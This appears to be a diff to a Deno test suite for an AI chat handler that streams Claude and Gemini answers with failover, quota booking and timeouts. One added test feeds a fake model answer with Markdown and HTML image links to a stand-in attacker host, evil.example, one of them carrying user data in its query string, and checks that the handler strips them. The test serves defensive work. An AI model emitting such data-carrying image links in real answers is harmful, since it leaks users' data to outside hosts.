@@ -9,7 +9,11 @@ import Anthropic from "npm:@anthropic-ai/sdk@1.8.0";
 import { mockFetch, streamFromChunks } from "../_shared/testing.ts";
 import { handleAiChat, quotaEventId, secondsUntilUtcMidnight, STREAM_MESSAGES } from "./handler.ts";
 import { DATA_BLOCK_CLOSE, DATA_BLOCK_OPEN, SYSTEM_INSTRUCTIONS } from "./prompt.ts";
-import { createClaudeProvider } from "./providers/claude.ts";
+import {
+  createAnthropicClient,
+  createClaudeProvider,
+  sdkStreamOpener,
+} from "./providers/claude.ts";
 import { createGeminiProvider } from "./providers/gemini.ts";
 import {
   answer,
@@ -27,6 +31,7 @@ import {
   sampleContext,
   TEST_USER,
   VALID_TOKEN,
+  withEmptyProcessEnv,
 } from "./testing.ts";
 import { ProviderError } from "./types.ts";
 
@@ -912,4 +917,161 @@ Deno.test("quotaEventId accepts a uuid, a row or a single-row array", () => {
 Deno.test("secondsUntilUtcMidnight", () => {
   assertEquals(secondsUntilUtcMidnight(Date.UTC(2026, 10, 15, 23, 59, 59)), 1);
   assertEquals(secondsUntilUtcMidnight(Date.UTC(2026, 10, 15)), 86_400);
+});
+
+// ---- Review findings -------------------------------------------------------------------------
+
+Deno.test("Markdown and HTML images from the model never reach a delta event", async () => {
+  const claude = fakeProvider(
+    "claude",
+    answer([
+      "Here: ![x](https://evil.example/c?",
+      "d=food_12345) [Verify](https://evil.example) <im",
+      'g src="https://evil.example/p"> ok!',
+    ]),
+  );
+  const h = harness([claude]);
+  const events = await readEvents(await handleAiChat(chatRequest(), h.deps));
+  await Promise.all(h.tasks);
+  assertEquals(events[0].event, "meta");
+  assertEquals(events.at(-1)?.event, "done");
+  assertEquals(deltaText(events), "Here: x [Verify](https://evil.example)  ok!");
+  for (const event of events.filter((e) => e.event === "delta")) {
+    const text = String(event.data.text);
+    assertFalse(text.includes("!["), "no image syntax in a delta");
+    assertFalse(text.includes("evil.example/c"), "no image URL in a delta");
+    assertFalse(text.toLowerCase().includes("<img"), "no img tag in a delta");
+  }
+});
+
+Deno.test("meta is only sent with visible text: an answer that is only an image ends with done", async () => {
+  const h = harness([fakeProvider("claude", answer(["![](https://evil.example/p?d=1)"]))]);
+  const events = await readEvents(await handleAiChat(chatRequest(), h.deps));
+  assertEquals(events, [{ event: "done", data: { truncated: false } }]);
+});
+
+Deno.test("real SDK with production retries: a Claude 429 fails over at once; both 429 -> rate_limited", async () => {
+  using fetchMock = mockFetch((req) => {
+    if (req.url.startsWith("https://api.anthropic.com/")) {
+      return new Response(
+        JSON.stringify({ type: "error", error: { type: "rate_limit_error", message: "slow" } }),
+        {
+          status: 429,
+          headers: { "content-type": "application/json", "retry-after": "20" },
+        },
+      );
+    }
+    return new Response(
+      JSON.stringify({ error: { code: 429, status: "RESOURCE_EXHAUSTED", message: "slow" } }),
+      { status: 429, headers: { "content-type": "application/json" } },
+    );
+  });
+  const claude = createClaudeProvider({
+    model: "claude-haiku-5-5",
+    // The production client (maxRetries: 1), not the test client with retries disabled.
+    open: sdkStreamOpener(withEmptyProcessEnv(() => createAnthropicClient("test-anthropic-key"))),
+  });
+  const gemini = createGeminiProvider({ apiKey: "test-gemini-key", model: "gemini-3.8-flash" });
+  const h = harness([claude, gemini]);
+  const started = performance.now();
+  const events = await readEvents(await handleAiChat(chatRequest(), h.deps));
+  await Promise.all(h.tasks);
+  assert(performance.now() - started < 5_000, "no SDK retry sleep");
+  assertEquals(events, [{
+    event: "error",
+    data: { code: "rate_limited", message: STREAM_MESSAGES.rate_limited },
+  }]);
+  const anthropicCalls = fetchMock.calls.filter((c) =>
+    c.url.startsWith("https://api.anthropic.com/")
+  );
+  assertEquals(anthropicCalls.length, 1, "the SDK does not retry the stream");
+  assertEquals(fetchMock.calls.length, 2);
+  assertEquals(String(h.logs.at(-1)?.entry.failover), "claude:rate_limited,gemini:rate_limited");
+});
+
+Deno.test("the stream closes right after done even if finish_ai_usage never returns", async () => {
+  const h = harness([fakeProvider("claude", answer(["ok"]))]);
+  const rpc = h.client.rpc.bind(h.client);
+  h.client.rpc = (fn, args) => fn === "finish_ai_usage" ? new Promise(() => {}) : rpc(fn, args);
+  const events = await readEvents(await handleAiChat(chatRequest(), h.deps));
+  assertEquals(events.at(-1)?.event, "done");
+  assertEquals(h.timers.pending(), 1, "only the booking timeout is left; pings stopped");
+  h.timers.tick(5_000);
+  await Promise.all(h.tasks);
+  assert(h.logs.some((l) => l.entry.step === "finish_ai_usage" && l.entry.error === "timeout"));
+  assertEquals(h.logs.at(-1)?.entry.status, "ok");
+});
+
+Deno.test("thinking between text deltas keeps the stream alive past the idle timeout", async () => {
+  const h = harness([]);
+  const sleep = (ms: number) =>
+    new Promise<void>((resolve) => h.timers.setTimeout(() => resolve(), ms));
+  const claude = createClaudeProvider({
+    model: "claude-haiku-5-5",
+    open: async function* () {
+      yield { type: "message_start", message: { usage: { input_tokens: 10 } } };
+      yield { type: "content_block_delta", delta: { type: "text_delta", text: "Start. " } };
+      yield { type: "content_block_start" };
+      for (let i = 0; i < 4; i++) {
+        await sleep(10_000);
+        yield { type: "content_block_delta", delta: { type: "thinking_delta", text: "hm" } };
+      }
+      yield { type: "content_block_stop" };
+      yield { type: "content_block_delta", delta: { type: "text_delta", text: "End." } };
+      yield {
+        type: "message_delta",
+        delta: { stop_reason: "end_turn" },
+        usage: { output_tokens: 9 },
+      };
+    },
+  });
+  h.deps.providers = [claude];
+  const reading = readEvents(await handleAiChat(chatRequest(), h.deps));
+  for (let i = 0; i < 4; i++) {
+    await flush();
+    h.timers.tick(10_000);
+  }
+  const events = await reading;
+  assertEquals(events.map((e) => e.event), ["meta", "delta", "delta", "done"]);
+  assertEquals(deltaText(events), "Start. End.");
+});
+
+Deno.test("tokens of a failed attempt are logged, and ttft_ms counts from the request start", async () => {
+  const started = deferred();
+  const claude = fakeProvider(
+    "claude",
+    hanging(() => started.resolve(), [{ type: "usage", usage: { inputTokens: 5000 } }]),
+  );
+  const gemini = fakeProvider(
+    "gemini",
+    answer(["Gemini"], "end", { inputTokens: 100, outputTokens: 5 }),
+  );
+  const h = harness([claude, gemini]);
+  const reading = readEvents(await handleAiChat(chatRequest(), h.deps));
+  await started.promise;
+  await flush();
+  h.timers.tick(12_000);
+  await reading;
+  await Promise.all(h.tasks);
+  const entry = h.logs.at(-1)?.entry;
+  assertEquals(entry?.provider, "gemini");
+  assertEquals(entry?.input_tokens, 100);
+  assertEquals(entry?.failover_input_tokens, 5000);
+  assert(Number(entry?.ttft_ms) >= 12_000, "ttft includes the failed attempt");
+  assertEquals(entry?.provider_ttft_ms, 0);
+  const finish = h.client.rpcCalls.at(-1)?.args;
+  assertEquals(finish?.p_provider, "gemini");
+  assertEquals(finish?.p_input_tokens, 100);
+});
+
+Deno.test("when every provider fails, the last attempt's tokens are booked", async () => {
+  const h = harness([
+    fakeProvider("claude", answer([], "end", { inputTokens: 700, outputTokens: 40 })),
+    fakeProvider("gemini", failing(new ProviderError("unavailable", { status: 503 }))),
+  ]);
+  await readEvents(await handleAiChat(chatRequest(), h.deps));
+  await Promise.all(h.tasks);
+  const entry = h.logs.at(-1)?.entry;
+  assertEquals(entry?.failover_input_tokens, 700);
+  assertEquals(entry?.failover_output_tokens, 40);
 });
